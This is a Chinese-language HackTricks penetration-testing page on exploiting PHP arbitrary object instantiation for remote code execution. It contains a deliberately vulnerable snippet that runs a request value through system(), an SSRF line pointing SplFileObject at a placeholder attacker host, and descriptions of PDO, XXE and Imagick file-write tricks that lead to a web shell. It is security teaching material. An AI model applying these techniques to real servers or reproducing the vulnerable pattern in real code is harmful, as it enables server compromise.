# PHP - RCE滥用对象创建：new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧。**

</details>

## 简介

在可以创建新的任意对象的情况下，比如`new $_GET["a"]($_GET["b"])`，你可能能够获得RCE，并且[**这篇文章**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)揭示了不同的获得RCE的方法。

## 通过自定义类或自动加载实现RCE

在构造`new $a($b)`中，**变量`$a`代表将要创建对象的类名**，变量**`$b`代表将传递给对象构造函数的第一个参数**。

如果`$a`和`$b`来自GET/POST，它们可以是**字符串或字符串数组**。如果它们来自**JSON**或其他地方，它们**可能具有其他类型**，比如对象或布尔值。

让我们考虑以下示例：
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

# Additionally, in PHP < 8.0 a constructor might be defined using the name of the class
class App2 {
function App2 ($cmd) {
system($cmd);
}
}

# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
在这段代码中，你可以将`$a`设置为`App`或`App2`，将`$b`设置为`uname -a`。之后，命令`uname -a`将被执行。

当你的应用程序中没有这样的可利用类，或者你需要的类在一个不被易受攻击的代码包含的单独文件中，你可以查看自动加载函数。

**自动加载函数**是通过注册回调函数`spl_autoload_register`或定义`__autoload`来设置的。当尝试创建一个未知类的实例时，它们会被调用。
```php
# An example of an autoloading function
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

# An example of an autoloading function, works only in PHP < 8.0
function __autoload($class_name) {
include $class_name . '.php';
};

# Calling spl_autoload_register with no arguments enables the default autoloading function, which includes lowercase($classname) + .php/.inc from include_path
spl_autoload_register();
```
根据PHP版本和自动加载函数中的代码，可能存在一些通过自动加载实现远程代码执行的方法。

## 通过内置类实现RCE

当您没有自定义类和自动加载时，您可以仅依赖**内置的PHP类**。

PHP内置类的数量在100到200之间，具体取决于PHP版本和已安装的扩展。可以使用`get_declared_classes`函数列出所有内置类，包括自定义类：
```php
var_dump(get_declared_classes());
```
可以通过[反射API](https://www.php.net/manual/en/book.reflection.php)找到具有有用构造函数的类。

使用反射API显示构造函数及其参数：[https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)\


![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/2.png)

如果您控制**多个构造函数参数并且可以随后调用任意方法**，则有许多方法可以获得远程代码执行。但是，如果您只能传递**一个参数并且没有对创建的对象进行任何调用**，几乎没有什么办法。

我只知道三种方法可以从`new $a($b)`中获取一些东西。

### **SSRF + Phar反序列化**

`SplFileObject`类实现了一个构造函数，允许连接到任何本地或远程URL：
```
new SplFileObject('http://attacker.com/');
```
这允许SSRF。此外，PHP < 8.0中的SSRF可以通过Phar协议的技术转化为反序列化。

### **利用PDOs**

PDO类有另一个有趣的构造函数：
```php
new PDO("sqlite:/tmp/test.txt")
```
`PDO`构造函数接受DSN字符串，允许我们使用已安装的数据库扩展连接到任何本地或远程数据库。例如，SQLite扩展可以创建空文件。

### **SoapClient/SimpleXMLElement XXE**

在PHP ≤ 5.3.22和≤ 5.4.12中，SoapClient的构造函数**容易受到XXE攻击**。SimpleXMLElement的构造函数也容易受到XXE攻击，但需要libxml2 < 2.9。

## 通过Imagick扩展实现RCE

检查您尝试利用的**项目的依赖项**，您可能会发现可以滥用以创建新对象来执行命令的**新类**。在这种情况下，发现Imagick对此非常有用。

### VID解析器

VID解析器允许在文件系统中的任意路径上编写任意内容，这将允许攻击者在可从网页访问的文件夹中编写PHPshell并获得RCE。

![](<../../../.gitbook/assets/image (157) (3).png>)

#### VID解析器 + 文件上传

当文件上传到PHP时，它会临时存储在`/tmp/phpXXXXXX`中。Imagick的VID解析器与**msl**协议允许在文件路径中**指定通配符**（因此可以轻松访问临时上传的文件）并将其**复制到任意位置**。\
这是在文件系统中获取任意文件写入的另一种方法：

![](<../../../.gitbook/assets/image (159).png>)

### PHP崩溃 + 暴力破解

[**原始写作**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)解释了通过**上传具有特定内容的文件**并使**服务器在删除该文件之前崩溃**，然后**暴力破解临时文件的名称**直到**Imagick执行任意PHP代码**的另一种方法。

然而，显然**崩溃技巧**只在旧版本的ImageMagick中**有效**。

## 参考资料

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>
